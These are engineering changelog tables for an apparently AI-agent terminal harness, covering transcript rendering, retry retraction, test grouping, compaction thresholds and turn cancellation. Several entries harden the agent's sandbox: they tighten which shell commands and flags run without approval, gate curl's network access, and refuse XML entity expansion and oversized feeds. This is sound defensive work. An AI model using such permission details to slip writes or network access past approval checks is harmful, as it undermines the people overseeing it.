| **`rerender()` is `flush_stream()` + `_replay()`** | Nothing; `/theme`'s behaviour is unchanged | The split is the point. `rerender()` cannot be the resize handler because the flush ENDS an open answer span, so a resize mid-turn would split the live answer into two entries under two `venastine ›` labels -- what §38's one-entry-per-span rule exists to prevent. That is the obstacle the register parked this item on for nine batches |
| **`_uncommit_partial_line` moves text from `_stream_text` back into `_pending`** -- and `_entries[-1]` with it | A reader of `_entries` that assumes the open entry holds everything committed so far. Pending text has never been in the entry log, so this keeps the existing rule rather than breaking it | Without it the replay draws `_stream_text` whole, ending mid-line, and the next committed chunk is a separate `write()` and therefore a separate ROW -- the join lands mid-row at the new width and the seam stays for the rest of the answer. If the tail was the whole entry the entry is dropped (with its `_links`/`_opens` rows, which are keyed by an index the next entry would take) |
| **`reflow()` commits again after the replay** | Nothing | Not tidying. The handed-back line is usually the WHOLE of an open span, because a model sends a paragraph before it sends a newline -- so a replay on its own leaves the reader watching a half-written answer disappear until the next delta. `_commit_thinking_ready` is split out of `thinking_delta` for the same reason: the reflow has to re-commit a buffer nothing has added to |
| **`_render_entry` takes `closed=True`** | A positional fifth argument. It is keyword-only | Only `reflow()` ever passes False, and only for a still-open THINKING span: replaying it would otherwise draw `╰ …done thinking` over reasoning that is still arriving. An open answer span needs nothing -- it has no closing furniture |
| **`reflow()` turns `auto_scroll` off and restores with `immediate=True`** | Nothing | Measured, not reasoned: `RichLog.write` calls `scroll_end(..., immediate=False)`, which DEFERS the scroll to after the next screen refresh -- so a position computed and set during the reflow was overwritten a frame later and the reader landed at the bottom however carefully it was worked out. `rerender()` is deliberately left alone: `/theme` belongs at the bottom |
| **`write()` records `_drawn_width`** | Nothing | It is the single funnel every drawn row passes through, so it is the one place that can say what width the screen is currently laid out at -- which is what lets `on_resize` ignore a height-only drag instead of replaying the session for it |
| **Standing: a new pre-wrapped construct must survive a RESIZE, not only a `/theme`** | -- | The diff gutter, the thinking bar and a list item's hanging indent are pre-wrapped by this widget because each needs a prefix per rendered row, and they were item 15's whole complaint. All three are cases in `TestAResizeRelaysTheTranscript`; a fourth belongs there the day it is added |
| **Standing: do not assert the debounce by sleeping through it** | A test that does. It will pass here and flake in CI | One `pilot.resize_terminal` costs ~100ms on this box, so a ten-step drag takes 1.06s -- longer than any debounce a test can afford to wait out, and under eleven xdist workers the margin is whatever the box is doing. `test_a_drag_re_arms_rather_than_stacking` pushes the debounce past the end of the test and asserts that each resize STOPPED the pending redraw before arming its own |
| **A `_render_entry` spy that swallows only `*args`** | `test_research_legibility.py::test_switching_theme_replays_the_transcript`, with a `TypeError` raised from inside `rerender()` | `closed` is KEYWORD-only, and that spy's own comment claimed it "takes whatever it is handed rather than enumerating the arguments" -- true of positionals only. It takes `**rest` now. The test is three files from anything this batch touched, so no targeted run could see it: batch 75's lesson about why the full suite is not optional |
| **Standing: a test that calls `reflow()` by hand must cancel the redraw the resize armed** | A test that does not. It passes whatever the reflow does | `pilot.resize_terminal` arms the debounced redraw; left to fire during a later `pause()` it re-lays from a COMPLETE entry log, so a finished answer comes out right however badly the explicit reflow behaved. Removing `_uncommit_partial_line` altogether was invisible until `TestAResizeRelaysTheTranscript._disarm` existed |

Count 6064 -> 6087.

## Batch 113 -- a call that already drew can be tried again (TECHNICAL_DEBT 25)

The last open item of the transcript cluster. Batch 91 gave the loop a retry and then had to
refuse it in the one place a reader would most want it, because a RichLog row could not be taken
back. Batch 112 made one retractable; this spends it.

| Change | What breaks | Symptom / fix |
|---|---|---|
| **The retry gate loses its screen predicate** | A test asserting a drawn run is NOT retried after a delta. One did: `test_a_drawn_run_that_already_showed_output_is_not_retried`, which is deleted, and the batch 91 row above naming it is superseded by this one | TECHNICAL_DEBT 25. `(shown and not drained)` existed for one stated reason -- "a RichLog row cannot be taken back" -- so a TUI turn that died mid-answer failed exactly as it had before batch 91, with the half-answer on screen and `[error: ...]` under it. The gate is now the retry budget and transience, and nothing else |
| **`drained` is REMOVED from `_run_steps`, and from the three wrappers that passed it** | Any caller passing `drained=`. There were three, all in this file | Its only reader was the clause above. Keeping it as an inert parameter was considered and rejected: a knob that does nothing is re-derived wrongly by the next reader. `test_one_rule_for_every_caller` reads the source and fails if a two-speed retry comes back -- a behaviour test that drives only one kind of caller could not see it return |
| **A research pass is retried after it has streamed, and always could have been safely** | Nothing on screen. The pipeline's `pass_activity` total is unchanged and still monotonic | The register called a pass a DRAWN run. `core/reasoning/orchestrator.py` translates `token_delta` into a throttled character count and says so in its own list -- "only the volume escapes, never the content" -- so the gate was refusing a retry to protect a counter. `Transcript` is the only surface in this repository that draws model text; `cli.py` is not a `token_delta` consumer at all |
| **`LoopEvent` grows a NINTH field, `retract`** | `test_pipeline_events.py::test_loop_event_did_not_grow_a_ninth_field`, which asserts the exact name set and is renamed to `..._a_tenth_field` | `{"text", "attempt", "attempts"}`. Display-only and, unlike `notice`, deliberately NOT mirrored onto `ModelResponse` -- a consumer that drains has drawn nothing and would be asked to undo something that never happened. The argument lives in that test, which is where §38's `thinking_delta` had to make its own |
| **This is not an error variant, and `core/events.py`'s rule is unchanged** | -- | That rule is about where a failure is HANDLED: it stays an exception so `orchestrator.py`'s failure-path persistence still fires. A retraction says the rows drawn so far are being replaced; the exception still propagates, unchanged, when the retries run out |
| **The event is yielded BEFORE the backoff wait, and only when the attempt drew something** | A test asserting the ordering the other way. None did; `test_the_retraction_arrives_before_the_wait` now pins it | The reader is about to watch a part-written answer vanish and then several seconds of nothing. `shown` survives the batch with a different job: no longer "may we retry" but "is there anything to take back" |
| **`Transcript.retract_to_mark(note=None)`** | Nothing. New method | Truncates `_entries` to the mark with `_drop_last_entry` (so the `_links`/`_opens` rows go too), clears both pending buffers, closes both spans, replays, and writes the note. It does NOT restore a scroll position the way `reflow()` does -- a retraction happens at the live end with the reader watching, which is `/theme`'s case rather than a resize's |
| **The boundary is a MARK, not the open span** | A future "simplification" to dropping the open entry | `_write_thinking_chunk` closes an open ANSWER before it draws, so one attempt with interleaved reasoning leaves several entries with only the last open -- measured as three, from text then reasoning then text. Dropping the open span would leave the first two on screen for the retry to draw again underneath. `test_dropping_the_open_span_would_not_have_been_enough` holds the measurement |
| **The mark is ARMED BY THE FIRST DELTA and cleared by `flush_stream`** -- not taken at the flush | A future move of the arming into `flush_stream`, which is where this batch first put it | Found by the test written to pin the other rule's stated cost. `write_system`, `write_user`, `write_error` and `write_role` all OPEN with `flush_stream()`, so a line written mid-span moved the mark PAST the attempt's own text: the retraction then deleted the unrelated line and KEPT the half-answer, wrong in both directions at once. Armed at the span's start, that window degrades to doing nothing |
| **A second retraction keeps the first one's line, and costs nothing to** | A future "fix" re-adding an explicit mark advance after the note | `write_system` opens with `flush_stream()`, which CLEARS the mark, so the note lands with nothing armed and the next delta arms after it. Under the rule this batch tried first -- where a flush SET the mark -- an explicit advance was needed, and the mutation pass found that line still present and no longer doing anything. Two failed attempts must not collapse to one line reading "attempt 3 of 3" with nothing saying there had been an attempt 2 |
| **The TUI's output-char meter and the pipeline's `pass_activity` are left MONOTONIC** | -- | Batch 61 counts chars "whether or not the renderer draws it" so the figure never goes still. It is liveness, not billing, and token accounting already counts only the attempt that succeeded; a running total that jumped backwards mid-turn would read as the defect rather than the honesty |
| **Standing: a shell that consumes `token_delta` must handle `retract` or draw the answer twice** | A new delta consumer that ignores it | There are two consumers today and only one draws: `tui/app.py` retracts, the research orchestrator deliberately translates nothing and records why in its own "what is NOT translated" list. A third would have to make the same choice, and nothing mechanical forces it to |
| **A fourth file asserted on `drained`** | `test_harness_rows.py::TestAWakeTurnRunsLikeTheRunItContinues::test_wake_conversation_writes_the_row_then_runs_the_loop`, with a `KeyError: 'drained'` | Three call sites were in `core/loop.py` and the fourth was an assertion on a captured kwarg, three files from anything this batch touched. `test_one_rule_for_every_caller` reads `RunAgentLoop`'s source, which is the right guard for the production side and says nothing about a test elsewhere asserting on a kwarg -- so the parallel full run was the only instrument that saw it. The assertion is deleted with nothing in its place, because a wake turn no longer differs from any other caller in what it may retry |
| **The retraction handler must not call `_end_thinking()` first** | -- | Every other branch of `on_loop_event` opens with it; this one cannot, because it closes the reasoning span and draws the delimiter onto entries about to be deleted. `retract_to_mark` clears the open-span flags itself, and the INDICATOR is stopped afterwards on #104's rule |

Count 6087 -> 6105.

## Batch 114 -- the suite's own floor, and a control that measured the wrong clock (TECHNICAL_DEBT 30, 31)

`--dist loadscope` groups a test by its CLASS where it has one and by its MODULE where it does not,
and a group is what gets handed to one worker. `tests/test_tui.py`'s 183 classless tests were
therefore a single indivisible unit -- 292 node ids, the floor every other worker waited on. They
are 41 classes now, cut along the section banners the file already carried.

| Change | What breaks | Symptom / fix |
|---|---|---|
| **A new test in `tests/test_tui.py` must be inside a class** | A module-level test added to that file, from now on | `TestThisFileIsGroupedForLoadscope::test_every_test_here_is_inside_a_class` parses the file with `ast` and names the stray. The section banner above a test names the class to file it under. It is the mirror of `test_storage_e2e.py::test_this_file_declares_no_test_class`, and it sits inside a class itself because a module-level test there would be the thing it forbids |
| **183 tests in `test_tui.py` changed NODE ID, and none changed name** | Anything holding `tests/test_tui.py::test_x` -- a saved node id, a CI rerun list, a `--deselect` | It is `tests/test_tui.py::TestSomething::test_x` now. The names are untouched, which is why `test_every_test_name_cited_in_production_code_resolves` stays green: it resolves NAMES, and `tui/app.py`'s two citations into this file still resolve. `-k` expressions are unaffected |
| **`test_tui.py` is 62 groups where it was 21** | A future coupling between two CLASSES in that file, which `loadscope` will now schedule apart | This is the cost `pytest.ini` already priced, taken deliberately. Nothing in the 183 was an ordered pair, and that was established by RUNNING every one of the 62 classes standing alone rather than by reading the file. An ordered pair still belongs inside one class |
| **Nothing was hoisted to make a class span a section** | -- | Four sections have a module-level helper, a data block or an existing `Test` class sitting between their own tests (`type_into_prompt`, `REVIEW`/`ASKS`, `_syntax_token_theme`, `TestEventsUnderAnOpenModal`). A class cannot span one, so each of those four yields TWO classes rather than a moved definition. 37 owners + 4 seams = 41 |
| **`test_the_probe_would_notice_a_child_that_kept_going` polls for the first tick** | Nothing. Same test, same subject | TECHNICAL_DEBT 31. It slept a fixed 1.0s before its first reading, so a cold interpreter start was inside the window it measured -- it failed once that way in batch 112's serial full run, with `assert 0 > 0` and a message about the budget clock. It measures growth from the first tick now, under a 30s deadline, and puts `proc.stderr` in the failure -- read AFTER the kill, since `.read()` on a live pipe blocks until EOF, which is why both failure paths are `pytest.fail` rather than an `assert` whose message would be built while the child is still up |
| **`test_themes.py` was NOT classed, and the count says it should have been** | -- | 319 classless node ids, more than test_tui.py's 292, and no classes at all. Measured at ~12.5s against a floor of ~38s, so classing it would lower nothing. Recorded in the register so the next reader does not rank by count |

## Batch 116 -- a ceiling under its own floor, and a feed parsed defused (TECHNICAL_DEBT 32, 18)

CI's `tests` job went red on a commit that changed only documentation. The failing assertion was a
wall-clock ceiling set below the cap of the operation it timed -- and the first fix misread the same number the same way, so both ceilings are relative now; the second half of
the batch is item 18's arXiv `defusedxml` bullet.

| Change | What breaks | Symptom / fix |
|---|---|---|
| **`arxiv_search` refuses a feed that DECLARES entities** | A caller relying on stdlib entity expansion in an arXiv Atom feed. Nothing in this repo does | `tools/builtin/arxiv.py` parses with `defusedxml.ElementTree` (pinned `defusedxml==0.7.1`). The tool returns `{"error": "arXiv returned a feed this parser refuses to expand, so nothing was read from it: ..."}`. Measured: stdlib expands `&lol2;` to `lollollol` and hands it back as a paper title |
| **A refused feed is NOT retried** | Anything counting on three HTTP attempts for every parse failure | Deliberate, and it has its own `except` ahead of the retry tuple. A malformed body is transient and worth retrying; a declared entity refuses identically every time, so retrying spends two more round trips and then reports "failed after 3 attempts" -- a network problem that is not there. `test_the_refusal_is_not_retried_as_a_network_failure` asserts exactly one request |
| **`defusedxml` exceptions are `ValueError`, not `ParseError`** | Any `except ET.ParseError` expecting to catch a hostile feed | The trap this batch nearly shipped. `defusedxml.ElementTree.ParseError` IS the stdlib object, so malformed XML and the empty-redirect-body path behave exactly as before -- but `EntitiesForbidden` and friends subclass `ValueError` and would have propagated out of `run()`. Catch `DefusedXmlException` explicitly |
| **Two timing ceilings in `tests/test_pilot_wait.py` are RELATIVE, not absolute** | A test that copied `assert elapsed < 1.0` from either of them | They calibrate one bare `pilot.pause()` and bound against `one_pause + n * PAUSE_CAP + 0.5`, where `PAUSE_CAP` is `wait_for_idle`'s `max_sleep` default read from `inspect.signature`. Do not restate the cap: 1000ms is `wait_for_idle`'s, while `Pilot.pause` awaits `_wait_for_screen(timeout=30.0)` first, and reading the one as the other set the ceiling wrong twice -- at 1.0, which CI failed at 1.010s, and again at a flat 2.0. Both still go red when mutated against the regression they name, and each now also asserts its own budget stays clear of the deadline it guards |
| **Two rows left `.github/bandit-baseline.json`** | Nothing; they no longer fire | B405 and B314 for `tools/builtin/arxiv.py`, removed BY HAND (40 deleted lines, round-trip verified byte-identical first). The baseline must never be regenerated on Windows: `results` are `./`-prefixed Linux paths and a local regeneration writes `.\`, which matches nothing in CI |
| **`tests.yml`'s comment no longer claims the suite is floor-bound** | -- | Comment only. Batch 114 closed TECHNICAL_DEBT 30 and updated AGENTS.md, ARCHITECTURE.md, README.md and pytest.ini, but not this file, which still described `test_tui.py`'s "28 module-level tests at 20.7%" as the floor and pointed at item 30 as open. "28" was the sync-only count and was wrong before 114 made it obsolete |

## Batch 117 -- nine findings from a second pair of eyes (TECHNICAL_DEBT 33-37)

An independent review of `077cf1b..HEAD` plus verification of its findings. Everything here PREDATES
batches 114-116 -- the oldest by two months -- so none of it is a regression from the recent work;
the only reason it lands now is that the review happened now.

| Change | What breaks | Symptom / fix |
|---|---|---|
| **`uniq` is no longer an inert command** | A `tiered` posture that relied on `uniq` running without approval | TECHNICAL_DEBT 34. GNU `uniq IN OUT` writes to its SECOND POSITIONAL argument, and a table of FLAGS cannot express that -- so it came off `config.INERT_COMMANDS` rather than being given a guard that could not fire. It still runs, by the ordinary sandboxed route, and now asks when the posture says to ask |
| **`tree -o FILE` and `date -s TIME` are no longer inert** | The same, for those two spellings | Both write, and neither had an entry in `_DANGEROUS_FLAGS`. The READING forms (`tree notes`, `date`) are unchanged, which is the point -- the guard is the flag, not the command |
| **A dangerous flag's `=` spelling is caught** | Nothing today | `sort --output=/tmp/x` is one token, equal to neither `-o` nor `--output`, so an exact-match check passed it. The token's head is compared as well now. `sort` is not inert, so this is defence-in-depth for a future re-addition -- which is what the entry was always for |
| **`curl.exe` and `CURL` now get network, and now ASK** | A Windows workflow where `curl.exe` silently ran with `--network none` | TECHNICAL_DEBT 34. `NETWORK_ALLOWED_COMMANDS` is fourteen lowercase bare names; the basename compare was case- and suffix-sensitive. This FAILED CLOSED before -- no egress -- but `not profile.network` is also a condition for SKIPPING approval, so the same program was denied the network it needed and eligible for a shortcut the bare spelling is not. One program, one answer |
| **`secrets.put()` rejects `\n` and `\r`** | Storing a multi-line value, which was accepted and then delivered truncated | TECHNICAL_DEBT 37. `sudo -S` reads one line and `_sudo_password_line` is `reveal() + b"\n"`, so a stored line break handed sudo the text before it. It failed closed (wrong password, quarantined entry) and explained nothing. Other whitespace is untouched -- a passphrase with spaces or tabs still works |
| **`arxiv_search` skips a malformed entry instead of failing the search** | A caller that treated any structural problem as a hard error | TECHNICAL_DEBT 33. Six omissions -- missing or empty `id`, `title`, `summary`, `published`, author `name` -- raised `AttributeError` or `TypeError` out of `_parse_atom_feed`, and neither is caught by `run`, so one bad entry cost the whole page. An entry with no id or title is dropped with a WARNING naming its index; the rest are tolerated |
| **A nameless `<author>` is dropped, not returned as `None`** | Code counting authors per entry | `authors` is rendered into a citation, where `None` reads as an author called None |
| **`TTLCache` takes a lock** | Nothing. Same API | TECHNICAL_DEBT 35. `spawn_subagent` is the only `parallel=True` tool and the comment beside that field already promised everything the child touches is concurrency-safe; this cache was the exception. `_sweep` is called with the lock HELD and must not take it -- the lock is a plain `Lock`, so re-entering deadlocks the writer |
| **The SSH `known_hosts` temp file is removed at exit** | Nothing | TECHNICAL_DEBT 36. The only `unlink` was in `_reset_ssh_probe`, which only tests call, so every SSH-using run left one file in TMPDIR. Registered per path with `atexit`, swallowing errors, because a cleanup that raises at shutdown turns a tidy-up into a traceback |

## Batch 118 -- the live tok/s figure, which read ~0 on the turns it was for (TECHNICAL_DEBT 38)

| Change | What breaks | Symptom / fix |
|---|---|---|
| **The live rate divides by GENERATING seconds, not active ones** | Anything reading `TurnMeter.rate()` and expecting `chars / elapsed` | A new `generating(now)` is `elapsed` minus time a tool was running, and `rate` uses it. `elapsed` is UNCHANGED, deliberately: a two-minute tool is part of how long the turn took, and the transcript still says `took 3m 10s`. Two clocks, two questions |
| **`TurnMeter.set_tool_running(delta, now)` is new, and takes a DELTA** | A caller passing a bool | `+1` on `tool_call_start`, `-1` on `tool_result`. Depth-counted because `_dispatch_parallel` can have several tools outstanding, and a boolean would un-pause on the first result while two were still running |
| **Thinking counts toward the live estimate** | Nothing | It is generated output and the providers that produce it bill it as such, so the completion line's exact figure already included it. The count sits OUTSIDE the `_show_thinking` branch: the characters exist whether or not the app draws them, and metering them behind the display switch would make `/thinking off` reintroduce the defect |
| **Tool-call arguments count toward it too** | Nothing | `StreamToken` carries text, thinking or the final response, so tool-call JSON never arrives as a delta -- generating a large call was denominator with no numerator. Measured by the serialised length of `tool_call_start["input"]`, and a params dict that will not serialise is skipped rather than dropping the event |

## Batch 119 -- the trigger's shape, and a turn count that could hold 230k (TECHNICAL_DEBT 39)

| Change | What breaks | Symptom / fix |
|---|---|---|
| **`compaction_trigger_fraction` is `0.90`, up from `0.85`** | Any thread that was folding at 0.85 of its window now folds later | Owner decision. 262k goes 222,822 -> 235,929 and 1M goes 850,000 -> 900,000. The fraction is now applied to the HEADROOM rather than to the trigger, so the two are the same number only above the crossover -- see the next row |
| **`compaction.headroom_for(window)` is new, and the trigger is `window - headroom_for(window)`** | Nothing calls it yet; `derived_trigger` no longer equals `fraction x window` at every window | The headroom is what the step AFTER the trigger has to fit inside, and there is no context-overflow handler in `core/` -- so it is clamped: never below `compaction_min_headroom_tokens` (16,000) and never above `compaction_max_headroom_fraction` (0.25) of the window. **Exactly `0.90` at every window at or above ~160k**, a floor below it. A 64k model keeps 16,000 tokens of headroom instead of the 6,553 a bare share would leave, and one capped read is 12,500 |
| **`keep_recent_turns` is a PREFERENCE, not a veto** | A thread with no more turns than the floor keeps now compacts where it previously reported `blocked` | M5's amendment. The count applies while it still leaves something foldable, and otherwise yields to the two floors that can measure what they hold -- the current turn (structural) and `keep_recent_tokens` (a size). Measured: `3 - 3 = 0` was holding 230k tokens on a thread 92.5% of which was foldable. Yields ALL the way rather than one turn at a time, because a one-step relaxation on that thread folds 253 tokens and then answers `no-progress` forever |
| **The `compaction_blocked` text no longer says "Context is full"** | A caller matching on the old string | It was false twice: the trigger is a fraction of the window, and it blamed SIZE where a turn COUNT was the cause. Now names the trigger, the floors, and the fact that a fold becomes possible once the turn completes |
| **The TUI usage line's denominator is the WINDOW** | A reader of the old `ctx 230k/223k` shape | Now `ctx 230k/262k (fold 236k)`, and the `*` for a session `/trigger` moved onto the fold figure, since it is the trigger that was overridden and not the window. `update_usage` takes a fifth argument, `window`; omitting it renders the old shape, so the four-argument callers are unchanged |

## Batch 120 -- a fold boundary inside a turn, when nothing else is legal (TECHNICAL_DEBT 40)

| Change | What breaks | Symptom / fix |
|---|---|---|
| **`compactable_span()` can return a watermark INSIDE a turn** | Anything assuming a watermark is always a turn start | Only when no turn-aligned boundary exists, which is the state batch 119 could not reach: a thread whose only turn is the one still running. The boundary is an assistant row, so M4 holds by construction -- inside a turn the archive is `user, (assistant, tool+)*`. A turn-aligned fold stays preferred, so every thread that folded before this folds in the same place |
| **`pinned_through()` also returns the turn's opening request** | A caller reading its result as "the pinned rows" | It was always "what the derived view must re-add from inside the covered span, with the span made whole" -- #88 is the same question for tool results. One index into the existing `keep` list, so the existing sort places it: a pinned row from an older turn lands before the request and one from inside this turn lands after it. Returns nothing for a turn-aligned watermark, so pre-batch-120 checkpoints are unaffected |
| **A mid-turn checkpoint renders one message longer than before** | `test_apply_checkpoint_rebuilds_the_view_in_place`, which asserted 3 | The extra row is the turn's request, carried verbatim instead of paraphrased into the summary -- M5's objection to folding a live turn, answered. That test's watermark is synthetic and always was: it splits an assistant row from the tool_result answering it, which M4 forbids and no production path produces |
| **M5 amended a second time** | Nothing in code | Batch 119 made the turn COUNT yield. Batch 120 says the current turn's MIDDLE may fold while its request and its recent steps stay verbatim. What M5 protects is the question, and the question is now carried rather than summarized |

## Batch 121 -- the terminal had two readers, and the trust prompt handed it the second

| Change | What breaks | Symptom / fix |
|---|---|---|
| **`_StdinReader.readline()` no longer starts the pump** | Nothing. A caller that wanted a pump wanted `ask()` | It has no deadline (N2), so there was nothing a thread could be abandoned for -- while starting one left a read parked on the terminal for the life of the process, which is the freeze. Once a pump exists the queue path is taken unchanged, so #100 stays fixed |
| **`main.py` releases stdin before the TUI** | A `main.py` stdin read placed AFTER `run_tui` -- there are none | `_release_terminal()` latches the reader closed: `_start()` refuses, `readline` raises `EOFError`, `ask` returns `None`. Reading a terminal this process handed over is the defect, and those two answers are what the callers already do with "nobody can answer" |
| **`tui.app.run()` takes `startup_notices`** | A double for it with a fixed signature -- one existed in `test_cli.py` | Pre-mount lines `main()` cannot print, because Textual erases stdout the moment it renders and the log handler attaches at mount. NOT batch 44's `startup_warnings` returning: that list was recomputable and went stale, these are facts the app cannot rediscover |
| **The user-level `mcp.json` is created at startup when absent** | Nothing reads differently; `{"mcpServers": {}}` loads as zero servers | Owner request. Two plausible homes for that file and nothing in a session saying which, so an edit went into a file the harness never reads. Never overwrites, and an existence check rather than a content one -- someone who emptied it meant to |
| **An MCP connect failure names its cause** | A test matching the old log text -- there were none | `failed to connect: ` with nothing after the colon, because the per-server `asyncio.timeout` raises `TimeoutError` and `str(TimeoutError())` is `""`. One `_reason()` for both the log line and the `failures` map, which were two strings with the better one not reaching the place a user looks first |
| **`startup` fixture redirects HOME** | A test relying on the real user tier through that fixture -- there were none | "Every side effect stubbed" was true only while nothing in the startup sequence wrote to the user tier. Something does now, and it created a file in the developer's own config directory before this was noticed |

## Batch 124 -- a turn can be stopped, and a stopped turn still owes its rows (ROADMAP_v3 §61)

| Change | What breaks | Symptom / fix |
|---|---|---|
| **`_run_steps` takes a `cancel` keyword** | Nothing. It defaults to None, which is every caller that predates §61 and means "nothing can stop this run" | `_run` forwards `**kwargs`, so only `_run_steps` and `run_agent_conversation` grew the parameter. `continue_conversation` and `wake_conversation` deliberately did NOT: CN12 defers the pipeline and the one-shot, and the CLI restores the default SIGINT handler before its session wait so Ctrl+C there keeps stopping the SESSIONS |
| **`stop_reason` has a fourth value, `"cancelled"`** | A consumer treating every non-`"complete"` value as truncation — and there is exactly one | `core/reasoning/orchestrator.py`'s `_check_truncation` continues the pipeline on a truncated pass that has text. No pass can return the new value today (CN12), so it is correct as it stands and **must** be taught the difference before the deferral is lifted. No tenth `LoopEvent` field: `tests/test_pipeline_events.py`'s nine-field pin is untouched |
| **`registry.dispatch` injects a ninth run-scoped value, `cancel`** | A test asserting dispatch's exact kwargs — there were FOUR, and the fourth is the one that matters: three in `test_loop_tool_dispatch.py` pin `cancel=None`, and `test_e2e.py::test_chat_mode_e2e_multi_turn_with_tool_use` drives the real CLI chat turn, which builds a token per turn (CN10) — so it pins `ANY` and then asserts the TYPE, because the useful claim there is that the shell's own token reached the tool layer. `test_streaming_loop.py`'s stub absorbs it through `**_run_scoped` and needed nothing | Add `cancel=None` to the pinned call. `None` is pinned rather than `ANY` for `call_id`'s reason one line down: a spawn that silently lost the token would run on past a stop the user had already asked for. registry.py's `available` map raises immediately on a name added to `_INJECTABLE_PARAMS` and forgotten there, and `test_cancel.py` now drives that guard |
| **A cancelled turn writes `{"error": ...}` rows for calls that never ran** | Anything counting tool results against calls dispatched | THE POINT, not a side effect. D20 persists every `tool_use` before anything runs, so stopping between two tool groups would leave calls recorded and results missing — M4's pairing broken, and an unresumable thread (#42, from the other side). Three calls produce three rows when only the first ever ran |
| **A cut stream persists a partial assistant message** | A test asserting an assistant row is only ever written once a response completes | CN4. `_run_steps` accumulates the deltas itself, because the Anthropic branch builds its text from `get_final_message()` and a cut stream has none. Empty text persists nothing. A half-formed tool call is dropped rather than written |
| **A synthesised cancelled response carries `usage={}`** | A reader doing `response.usage["input_tokens"]` rather than `.get(...)` | CN5, and the empty dict is load-bearing: absent means "not measured", present-and-zero means "measured, cost nothing". `main.py`'s stopped-early line reads it to say the stopped step is not counted |
| **`escape` has a second app-level binding** | A test asserting escape's only app action is `close_thread_view` — there were none | CN8. Both refuse with `False` so the key hands off, which is the ctrl+c pair's measured rule. `PromptInput` keeps the key while its suggestion panel is open, because that binding refuses with `None` and so keeps its slot |
| **`main.py` installs a SIGINT handler around each chat turn** | A test driving `run_chat` and expecting `KeyboardInterrupt` to propagate out of a turn | CN10. Restored in a `finally`, so Ctrl+C at the prompt still exits and `_await_sessions` still catches its own. A handler rather than an `except` because an interrupt unwinds from wherever it lands, which can be between a `tool_use` and the `tool_result` that pairs with it |

## Batch 125 -- every tool line opens its call (ROADMAP_v3 §55)

| Change | What breaks | Symptom / fix |
|---|---|---|
| **`registry.opens()` NEVER returns `()` again** | Every consumer that used the falsy tuple as its gate, and five tests that pinned it: `test_session_display.py` (`shell`, an unknown `mcp__*` name, and the tuple a replay carries), `test_interactive_sessions.py` (`shell_input`) and `test_agent_navigation.py` (`fetch_url` through replay) | TR7. The gate is now the CALL ID: an unarmed tool line is one whose call the archive cannot be asked about, never one whose tool declared nothing. `core/replay.py`'s surviving `if opens` is a guard with nothing left to guard, kept because the tuple is indexed on the next line. Expect `("call",)` where you expected `()` |
| **`OPENS_CALL` is answered WITHOUT a registry lookup** | An assumption that `opens()` describes a registered tool | Deliberate, and the one part of TR7 not to re-derive. `opens_thread`/`opens_session` are False for a tool this registry has never seen -- a runtime-registered MCP tool, or one removed between a thread being written and being replayed -- and neither is a reason to hide a stored result. The fallback is a property of the ARCHIVE |
| **`write` and `edit` transcript lines are armed** | A test asserting the diffed branch draws a bare unarmed line -- there were none | TR7's no-exception rule, and these two are what makes it earn itself: §41's X4 kept `content` off the line, and the diff that replaced it shows the CHANGE rather than the call, so the pane is the only place the untruncated call can be read |
| **A spawn or session line whose target cannot be resolved opens the CALL** | Two refusal sentences and the three tests pinning them: `"no thread to open"` (twice, in `test_agent_navigation.py`) and `"nothing to show"` (`test_session_display.py`) | TR12. Both described exactly the state in which the call's own `{"error": ...}` answers the question, from the same archive the handler had just read. The new sentence -- `"not in this conversation's record"` -- fires only when the call is absent too. A line carries exactly ONE kind, so without this the three tools that open a thread or a session had no route to their own params and results |
| **`tui/app.py` holds a twelfth widget and `#pane` has a fourth child** | `test_the_held_widget_count_matches_the_prose`, and any test asserting the switcher's children by name | TR10. `#call-view` must carry `app.tcss`'s shared box (`border: solid`, `padding: 0 1`): a hidden pane measures 0 and borrows the on-screen pane's width, so a different gutter silently rewraps every row the live transcript writes while the viewer is up |
| **`test_both_panes_measure_the_same_width_when_shown` is renamed and widened** | Its old name, cited in `tui/widgets.py` and in this file | Now `test_the_panes_measure_the_same_width_when_shown`, and it asks the switcher for its children rather than naming two. "Both" was already wrong when SS14 added `#session-view` in batch 98 and the assertion was never widened -- so a third pane with a different gutter would have shipped behind a green test whose NAME said it was covered. A fifth pane fails it by existing |
| **`core/session_view._lines` is now `output_lines`** | An importer of the private name -- there were none | `core/call_view.py` paints the same kind of thing, and one-entry-per-line is a fact about how a Transcript draws rather than about sessions. Renamed rather than re-implemented, so there is one answer and one place to fix it |
| **`_viewing` can hold a third tagged tuple, `(_VIEW_CALL, call id)`** | Anything type-sniffing `_viewing` instead of asking `_viewing_thread` / `_viewing_live_session` / `_viewing_call` | TR10/TR11. It needed no new poll rule: `_viewing_live_session` already answers None for any tag that is not `_VIEW_LIVE`, which is what keeps the timer off a view with nothing to re-read |
| **Opening a call view logs its policy warning as `<tool> (call params)`** | A test matching `"Output policy altered <tool> result"` for a call view -- there were none | TR15. `check_output_policy` logs one WARNING naming the tool and its sentence says "result", so a credential found in the ARGUMENTS would have been reported as having been in the output. The tool name is the only thing that message reads, so saying which half costs nothing |

## Batch 126 -- two bounds for the tool whose output nothing bounded (TECHNICAL_DEBT 41)

| Change | What breaks | Why it is correct |
|---|---|---|
| **`_call_arxiv_api` streams; reverting it to `httpx.get`** | Nothing in the suite -- the fake httpx serves `get` and `stream` from one queue -- which is exactly why this row exists | ROADMAP_v2 §31 (H7), #55. `httpx.get(...).text` buffers the whole body before anything slices it, and `fetch_url.py`'s own comment rules out a Content-Length check because a hostile server can omit it or lie about it. This was the last `httpx.get` in production code, in front of a feed the module header calls attacker-influenced |
| **Removing `MAX_FEED_BYTES` or raising it "because 2 MiB is arbitrary"** | `test_the_cap_is_the_measured_one` | It is derived, and the FIRST derivation was wrong: a guess of ~100 KB per hyperauthorship entry. Measured, the heaviest legitimate feed is 838,560 bytes (`max_results=20`, 13,859 `<author>` elements), so 2 MiB clears the real worst case by 2.5x. A cap BELOW the largest real feed is a false refusal -- the tool reporting it read nothing for a query arXiv answered correctly |
| **Changing `total > MAX_FEED_BYTES` to `>=`** | `test_a_feed_at_exactly_the_cap_is_accepted` | A bound that refuses the body it was sized for is the false refusal above, arriving one byte early |
| **Retrying the oversized feed** (folding `_FeedTooLarge` into the `httpx.HTTPError` clause) | `test_the_refusal_is_not_retried` | The reasoning already written one clause down for a declared entity: a feed this large is this large again, so two more round trips reach the same place and then report "failed after 3 attempts", which describes a network problem that is not there |
